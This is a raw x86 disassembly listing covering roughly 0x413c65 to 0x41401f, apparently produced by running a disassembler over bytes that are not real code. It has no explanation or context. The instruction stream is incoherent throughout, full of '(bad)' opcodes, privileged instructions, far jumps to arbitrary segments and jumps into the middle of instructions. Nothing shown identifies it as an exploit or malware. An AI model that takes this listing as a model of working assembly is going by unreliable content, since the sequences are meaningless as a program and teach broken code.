  413c65:	push   ds
  413c66:	cld    
  413c67:	xor    BYTE PTR [edx+0x3caa42eb],0xef
  413c6e:	test   DWORD PTR [ebp-0x44c8edbc],edx
  413c74:	sbb    DWORD PTR [edx],0xbb41a4a2
  413c7a:	adc    al,BYTE PTR [edi+0x192c3552]
  413c80:	cmp    eax,0xd3e97290
  413c85:	pop    esp
  413c86:	test   eax,0x94f4b2be
  413c8b:	(bad)  
  413c8c:	mov    dh,0xd7
  413c8e:	pushf  
  413c8f:	mov    gs,edi
  413c91:	icebp  
  413c92:	out    dx,eax
  413c93:	loop   0x413c7d
  413c95:	add    DWORD PTR [esi-0x3a73b366],edx
  413c9b:	ds dec edx
  413c9d:	imul   eax,DWORD PTR [ecx+eiz*8-0x7a8f0d8b],0x62008544
  413ca8:	mov    ds:0xb3a68a11,eax
  413cad:	or     esp,eax
  413caf:	and    ebp,DWORD PTR [ecx+esi*8+0x1ee9f58e]
  413cb6:	scas   al,BYTE PTR es:[edi]
  413cb7:	fist   DWORD PTR [edx-0x4515146f]
  413cbd:	clc    
  413cbe:	push   eax
  413cbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cc0:	mov    ebp,0xbe2a05fd
  413cc5:	mov    eax,ds:0x95b2d3de
  413cca:	test   DWORD PTR [ebp+0xb7cc68d],ebx
  413cd0:	leave  
  413cd1:	cmc    
  413cd2:	jbe    0x413c62
  413cd4:	mul    DWORD PTR [ebx+esi*1+0x28d91f96]
  413cdb:	aas    
  413cdc:	shl    BYTE PTR [esi+ebx*2-0x1c],cl
  413ce0:	fldenv [eax-0x2a]
  413ce3:	popf   
  413ce4:	xlat   BYTE PTR ds:[ebx]
  413ce5:	adc    esp,ecx
  413ce7:	pop    ebx
  413ce8:	jae    0x413c6b
  413cea:	push   ebp
  413ceb:	leave  
  413cec:	sbb    edx,0xffffff8a
  413cef:	enter  0x3000,0x9f
  413cf3:	jmp    0x413d3c
  413cf5:	cmp    dl,BYTE PTR [ebp+0x7c3924aa]
  413cfb:	aas    
  413cfc:	push   ebx
  413cfd:	mov    WORD PTR [ebx-0x5e],ss
  413d00:	or     bh,ah
  413d02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d03:	pop    esi
  413d04:	pop    edi
  413d05:	into   
  413d06:	test   DWORD PTR [edi-0x20],eax
  413d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d0a:	cdq    
  413d0b:	mov    DWORD PTR [ecx+0x75],ebp
  413d0e:	xchg   edx,eax
  413d0f:	mov    gs,WORD PTR [eax]
  413d11:	push   esi
  413d12:	jno    0x413cab
  413d14:	or     BYTE PTR [ecx+0x3d1983e],bh
  413d1a:	xor    esi,DWORD PTR [ebx-0x19]
  413d1d:	icebp  
  413d1e:	stos   BYTE PTR es:[edi],al
  413d1f:	arpl   WORD PTR [edi+0x518ea28f],di
  413d25:	mov    bh,0x4d
  413d27:	mov    eax,0x74b823f5
  413d2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d2e:	test   DWORD PTR [ecx+ebp*4+0x46e77882],eax
  413d35:	ror    BYTE PTR [edx-0x69],cl
  413d38:	fnstcw WORD PTR [edx]
  413d3a:	xchg   esp,eax
  413d3b:	inc    esp
  413d3c:	adc    dl,BYTE PTR [eax]
  413d3e:	dec    esp
  413d3f:	sbb    eax,0x538ec3a2
  413d44:	shl    bh,cl
  413d46:	adc    DWORD PTR [eax+0x1002ffd8],edi
  413d4c:	jnp    0x413d6c
  413d4e:	xor    eax,0xaad422c9
  413d53:	cmc    
  413d54:	sub    ch,BYTE PTR [esi+ecx*4]
  413d57:	icebp  
  413d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d59:	pop    ss
  413d5a:	aaa    
  413d5b:	pop    esp
  413d5c:	cmp    eax,0x9e46ddf1
  413d61:	retf   0x97d6
  413d64:	sti    
  413d65:	inc    eax
  413d66:	mov    dl,BYTE PTR ds:0x54277e77
  413d6c:	(bad)
  413d70:	cs std 
  413d72:	mov    ebx,0x60c7baac
  413d77:	mov    cs,WORD PTR [ecx+0x61dd72a5]
  413d7d:	(bad)
  413d80:	shr    cl,cl
  413d82:	lock popf 
  413d84:	jp     0x413db7
  413d86:	shl    BYTE PTR [edi],0xeb
  413d89:	adc    esp,ebp
  413d8b:	cvtps2pi mm0,QWORD PTR [esi-0x4c11e81b]
  413d92:	test   dh,ch
  413d94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d95:	xchg   esp,eax
  413d96:	adc    DWORD PTR [edi+0x12],ecx
  413d99:	cmp    eax,0x118361ad
  413d9e:	cmp    al,0x6c
  413da0:	cmp    al,0xeb
  413da2:	mov    esp,0x8be1ddbe
  413da7:	adc    eax,0xebce1c08
  413dac:	or     dh,cl
  413dae:	jmp    0x413df2
  413db0:	scas   al,BYTE PTR es:[edi]
  413db1:	outs   dx,DWORD PTR ds:[esi]
  413db2:	les    ecx,FWORD PTR [esi+0x7ad42e45]
  413db8:	scas   eax,DWORD PTR es:[edi]
  413db9:	nop
  413dba:	sbb    ch,ah
  413dbc:	rcl    BYTE PTR [esi],cl
  413dbe:	ins    BYTE PTR es:[edi],dx
  413dbf:	into   
  413dc0:	imul   esi,DWORD PTR [ebp-0x67],0xe
  413dc4:	xor    esi,edi
  413dc6:	loope  0x413e32
  413dc8:	cmp    BYTE PTR [esi-0x30],0xc6
  413dcc:	mov    dl,0x45
  413dce:	pop    edx
  413dcf:	(bad)  
  413dd0:	lock push esi
  413dd2:	retf   0xaef2
  413dd5:	mov    DWORD PTR [ecx-0x19e86dfc],ecx
  413ddb:	mov    esp,0x8cd5b9ef
  413de0:	mov    cl,0x0
  413de2:	push   eax
  413de3:	sub    al,0x7f
  413de5:	mov    al,ds:0xd21ba5e5
  413dea:	test   DWORD PTR [esi-0xb],esp
  413ded:	ss add cl,ah
  413df0:	jne    0x413da7
  413df2:	test   BYTE PTR [esi+0x192b1060],cl
  413df8:	mov    dh,0x18
  413dfa:	retf   0xd2ed
  413dfd:	int    0xac
  413dff:	bound  edi,QWORD PTR [eax]
  413e01:	ja     0x413e37
  413e03:	and    ah,cl
  413e05:	adc    DWORD PTR [ebp-0x1a],eax
  413e08:	mov    al,ds:0x577c3dd1
  413e0d:	mov    edx,0x7cd25fd8
  413e12:	sub    al,BYTE PTR [eax]
  413e14:	lods   al,BYTE PTR ds:[esi]
  413e15:	lahf   
  413e16:	imul   edi,DWORD PTR [ebx],0x8f6f11c6
  413e1c:	imul   ecx,DWORD PTR [eax],0x6448670f
  413e22:	test   ch,dl
  413e24:	push   ss
  413e25:	mov    ebp,0xf4847df9
  413e2a:	stos   DWORD PTR es:[edi],eax
  413e2b:	xchg   DWORD PTR [ebp+0x27],esp
  413e2e:	or     eax,0x4253488e
  413e33:	lods   eax,DWORD PTR ds:[esi]
  413e34:	sbb    dh,BYTE PTR [ebp-0x79]
  413e37:	mov    BYTE PTR [eax-0x11],cl
  413e3a:	mov    DWORD PTR [ecx-0x4e],edx
  413e3d:	ins    DWORD PTR es:[edi],dx
  413e3e:	cmp    ah,BYTE PTR [ebp+0x41]
  413e41:	adc    eax,0xd4edcd8c
  413e46:	fs jmp 0x1c81:0x85faf1a1
  413e4e:	leave  
  413e4f:	int3   
  413e50:	shl    BYTE PTR [ecx],cl
  413e52:	jnp    0x413e6d
  413e54:	cld    
  413e55:	push   ds
  413e56:	jecxz  0x413e09
  413e58:	pop    esi
  413e59:	adc    DWORD PTR [eax],esp
  413e5b:	sbb    ah,0x95
  413e5e:	repz hlt 
  413e60:	sub    DWORD PTR [esi],ebp
  413e62:	add    edx,ecx
  413e64:	fwait
  413e65:	aaa    
  413e66:	test   DWORD PTR [edx-0x25],edx
  413e69:	outs   dx,BYTE PTR ds:[esi]
  413e6a:	idiv   DWORD PTR [edx-0x4b]
  413e6d:	icebp  
  413e6e:	or     al,0x8e
  413e70:	or     al,0xa7
  413e72:	fwait
  413e73:	aam    0x34
  413e75:	and    al,0x16
  413e77:	(bad)  
  413e79:	popa   
  413e7a:	or     eax,0x63038fe5
  413e7f:	push   ecx
  413e80:	jne    0x413e82
  413e82:	pusha  
  413e83:	ja     0x413e81
  413e85:	adc    eax,edx
  413e87:	call   0xc6d3:0x2c0668d9
  413e8e:	(bad)  
  413e90:	xchg   BYTE PTR [edx],dh
  413e92:	stos   BYTE PTR es:[edi],al
  413e93:	cmp    ebx,DWORD PTR [esi-0x172c83e]
  413e99:	sbb    BYTE PTR ds:0xdd501d7c,0x12
  413ea0:	shl    BYTE PTR [eax+0x60ee693d],cl
  413ea6:	dec    eax
  413ea7:	int3   
  413ea8:	std    
  413ea9:	out    0x1c,eax
  413eab:	mov    cs,edx
  413ead:	scas   al,BYTE PTR es:[edi]
  413eae:	adc    al,bl
  413eb0:	push   0x36
  413eb2:	inc    ebx
  413eb3:	retf   0x47d8
  413eb6:	rcr    ecx,1
  413eb8:	rol    BYTE PTR [ebx+esi*1],cl
  413ebb:	icebp  
  413ebc:	sub    dl,BYTE PTR [edi]
  413ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ebf:	mov    gs,WORD PTR [ebx-0x30]
  413ec2:	xlat   BYTE PTR ds:[ebx]
  413ec3:	pop    edi
  413ec4:	dec    esp
  413ec5:	xor    cl,BYTE PTR [edx]
  413ec7:	test   edx,edx
  413ec9:	lock add dl,al
  413ecc:	cmp    BYTE PTR [ebx-0x38],0x55
  413ed0:	inc    ecx
  413ed1:	push   ds
  413ed2:	dec    esi
  413ed3:	lods   al,BYTE PTR ds:[esi]
  413ed4:	aam    0xaf
  413ed6:	pop    esp
  413ed7:	mov    al,0x11
  413ed9:	adc    eax,0xf6d32c75
  413ede:	push   ebp
  413edf:	scas   eax,DWORD PTR es:[edi]
  413ee0:	or     eax,0x22fabe28
  413ee5:	xchg   esi,eax
  413ee6:	mov    eax,ds:0x3cb18b93
  413eeb:	add    eax,0x9815fcaa
  413ef0:	xor    eax,0x93a93c7e
  413ef5:	jmp    0xeee9:0xbc86d1fc
  413efc:	xlat   BYTE PTR ds:[ebx]
  413efd:	(bad)  
  413efe:	not    dl
  413f00:	jne    0x413f20
  413f02:	xchg   ecx,eax
  413f03:	push   edi
  413f04:	shr    BYTE PTR [esi+ecx*2-0x73],0xb7
  413f09:	pop    esi
  413f0a:	test   BYTE PTR [ebx-0x84b3141],bh
  413f10:	imul   ecx,DWORD PTR [edx],0xffffff99
  413f13:	mov    gs,WORD PTR [ecx]
  413f15:	lods   al,BYTE PTR ds:[esi]
  413f16:	push   ebx
  413f17:	adc    eax,0xd0e8fce8
  413f1c:	shr    ch,cl
  413f1e:	test   eax,0xbf6683d1
  413f23:	mov    BYTE PTR [esi+0x1e],0xab
  413f27:	lods   eax,DWORD PTR ds:[esi]
  413f28:	inc    esp
  413f29:	xor    al,0x86
  413f2b:	mov    esi,0xf9853b77
  413f30:	dec    edi
  413f31:	mov    eax,0x17c13c19
  413f36:	jecxz  0x413ec6
  413f38:	mov    al,0xf1
  413f3a:	clc    
  413f3b:	ficom  WORD PTR [eax-0x54]
  413f3e:	fdiv   DWORD PTR [ecx+eax*8+0x26e44627]
  413f45:	add    ah,BYTE PTR [eax-0x65]
  413f48:	xchg   edx,eax
  413f49:	les    edx,FWORD PTR [edi-0x5ba47e7c]
  413f4f:	xchg   ebx,eax
  413f50:	mov    WORD PTR [edi],?
  413f52:	popa   
  413f53:	nop
  413f54:	jns    0x413ede
  413f56:	jne    0x413f0c
  413f58:	fmul   DWORD PTR [ecx-0x732d029b]
  413f5e:	mov    dh,0x82
  413f60:	add    esi,0x1e72cd09
  413f66:	mov    edx,es
  413f68:	lock sub eax,0xbf5cd60b
  413f6e:	aam    0x75
  413f70:	rcr    BYTE PTR [ecx-0x6582eea3],cl
  413f76:	jmp    0xd98e:0xd799bf1f
  413f7d:	adc    al,0xe8
  413f7f:	fcom   DWORD PTR [edi+edx*8+0x52d20ef2]
  413f86:	or     edx,DWORD PTR [ecx+0x2c]
  413f89:	ficomp DWORD PTR [ecx-0x5]
  413f8c:	jne    0x413f7d
  413f8e:	xchg   esi,eax
  413f8f:	xchg   edi,eax
  413f90:	js     0x413f4c
  413f92:	or     esi,0xffffffe8
  413f95:	xchg   ecx,eax
  413f96:	faddp  st(1),st
  413f98:	and    ah,BYTE PTR [ebx]
  413f9a:	test   DWORD PTR [eax+0x7ffe0184],edx
  413fa0:	mov    WORD PTR [ebx],?
  413fa2:	sub    al,0x8c
  413fa4:	mov    esi,0x4b1a75e6
  413fa9:	sar    DWORD PTR [ecx],1
  413fab:	out    dx,eax
  413fac:	mov    dl,0xe
  413fae:	stos   BYTE PTR es:[edi],al
  413faf:	xor    eax,0x85d13bc1
  413fb4:	push   edx
  413fb5:	int3   
  413fb6:	mov    ch,0x9c
  413fb8:	and    edx,DWORD PTR [esi+edx*1]
  413fbb:	imul   bh
  413fbd:	adc    DWORD PTR [edi-0x5b651d95],esi
  413fc3:	add    esp,DWORD PTR [esi-0x15a17b94]
  413fc9:	sahf   
  413fca:	pop    esi
  413fcb:	xor    dl,BYTE PTR es:[edi]
  413fce:	mov    dh,0x8f
  413fd0:	sbb    al,0xa2
  413fd2:	inc    ebp
  413fd3:	dec    esi
  413fd4:	(bad)  
  413fd5:	pop    es
  413fd6:	xor    esi,DWORD PTR [ecx]
  413fd8:	dec    ebp
  413fd9:	pop    ecx
  413fda:	test   BYTE PTR [edi+0x42a1e4f1],cl
  413fe0:	sub    dh,ah
  413fe2:	mov    ch,0xa9
  413fe4:	cmp    cl,BYTE PTR [edi-0x2]
  413fe7:	int    0x5a
  413fe9:	jne    0x414030
  413feb:	push   edi
  413fec:	daa    
  413fed:	inc    eax
  413fee:	imul   ebx,esi,0xffffffbd
  413ff1:	sbb    ah,bh
  413ff3:	add    al,0x3f
  413ff5:	ins    BYTE PTR es:[edi],dx
  413ff6:	jge    0x413fc6
  413ff8:	and    edi,esi
  413ffa:	test   ch,ah
  413ffc:	inc    edx
  413ffd:	push   ds
  413ffe:	mov    esp,0xbdd7661d
  414003:	mov    dl,0x1
  414005:	dec    edx
  414006:	lahf   
  414007:	mov    ebp,0x8e19d9e6
  41400c:	sub    ah,ch
  41400e:	xchg   ebp,eax
  41400f:	repz pop esi
  414011:	xchg   BYTE PTR [ecx+esi*2+0xadfc3c6],bl
  414018:	ins    DWORD PTR es:[edi],dx
  414019:	jmp    0x96be2b45
  41401e:	push   edx
  41401f:	aaa    
	...
